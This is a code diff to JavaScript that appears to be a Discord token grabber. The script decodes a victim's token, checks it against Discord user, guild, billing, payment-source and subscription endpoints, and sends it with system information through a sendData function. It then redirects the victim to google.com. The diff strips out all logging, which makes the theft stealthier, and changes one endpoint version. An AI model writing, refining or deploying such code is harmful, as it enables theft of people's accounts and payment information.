@@ -47,7 +47,7 @@
     // Discord API endpoints for token validation
     const DISCORD_API = {
       USER_INFO: 'https://discord.com/api/v9/users/@me',
-      GUILDS: 'https://discord.com/api/v9/users/@me/guilds?with_counts=true',
+      GUILDS: 'https://discord.com/api/v6/users/@me/guilds?with_counts=true',
       BILLING: 'https://discord.com/api/v9/users/@me/billing/payment-sources',
       SUBSCRIPTIONS: 'https://discord.com/api/v9/users/@me/billing/subscriptions',
       BOOST_SLOTS: 'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots'
@@ -71,7 +71,6 @@
       }
 
       if (!rawToken) {
-        console.log('[✗] No token found');
         location.href = 'https://google.com';
         return;
       }
@@ -94,7 +93,6 @@
         if (decoded !== token) token = decoded;
       } catch (e) {}
 
-      console.log('[→] Processing token...');
 
       try {
         hasSent = true;
@@ -125,13 +123,11 @@
         const success = await sendData(token, systemInfo, userAgent, validationResult);
 
         if (success) {
-          console.log('[✓] Valid token sent successfully');
         }
 
         location.href = 'https://google.com';
 
       } catch (e) {
-        console.error('[✗] Error:', e);
         location.href = 'https://google.com';
       }
     }
